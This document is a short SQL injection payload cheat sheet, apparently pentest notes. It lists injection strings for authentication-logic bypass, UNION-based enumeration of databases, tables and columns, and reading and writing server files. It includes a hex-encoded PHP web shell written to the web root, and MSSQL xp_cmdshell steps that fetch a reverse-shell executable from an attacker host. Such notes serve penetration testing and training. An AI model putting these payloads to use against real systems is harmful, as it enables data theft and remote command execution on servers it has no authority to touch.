PortSwigget Cheat Sheet: https://portswigger.net/web-security/sql-injection/cheat-sheet

Pentestermonkey SQL injection cheat sheet: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection

## Logic
**Server expects string**

	1' or 'a'='a
	1' or 'a'='b
	') or 1=1; -- -

**Server expects integer**

	1 or 'a'='a'
	1 or 'a'='b'

## Union Select
	1' UNION SELECT null; -- -
	1' UNION SELECT null,null; -- -
	...
	Until the number of fields is found. Then change null for string or integer to find it's type

## Injections

### Info
	1' UNION SELECT null,@@version-- -
	1' UNION SELECT null,version()-- -
	1' UNION SELECT null,sqlite_version()-- -
	1' UNION SELECT null,* FROM v$version-- -
	1' UNION SELECT null,@@database-- -
	1' UNION SELECT null,database()-- -
	1' UNION SELECT null,* FROM information_schema.tables-- -
	1' union select 1,group_concat(schema_name)from information_schema.schemata-- -

### Tables
	1' UNION SELECT null,table_name FROM information_schema.tables-- -
	1' union select 1,group_concat(table_name) from information_schema.tables where table_schema = database()-- -
	1' union select 1, table_name FROM information_schema.tables-- -

### Columns
	1' UNION SELECT null,column_name FROM information_schema.columns where table_name = 'users_owgtcb'-- -
	1' union select 1,group_concat(column_name) from information_schema.tables where table_schema = database()-- -
	id=1' union select 1, column_name FROM information_schema.tables-- -

### Write files
	1' union select 1,'Hello from SQLI' INTO OUTFILE '/var/www/html/shell.php' from [database].queue-- -

###### Write CMD shell
	 1' union select 1,unhex('3C3F7068702073797374656D28245F4745545B22636D64225D29203F3E') INTO OUTFILE '/var/www/html/shell1.php' from [database].queue-- -

### Read files
	1' UNION SELECT 1,LOAD_FILE("/var/www/html/index.php")-- -

## Microsft SQL Server
**Activate xp_cmdshell**

	'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --

Execute command line commands

	'; EXEC xp_cmdshell '[Command]'; --
	'; EXEC xp_cmdshell 'certutil -urlcache -f http://[Attacker IP]:8000/reverse.exe C:\Windows\Temp\reverse.exe'; --


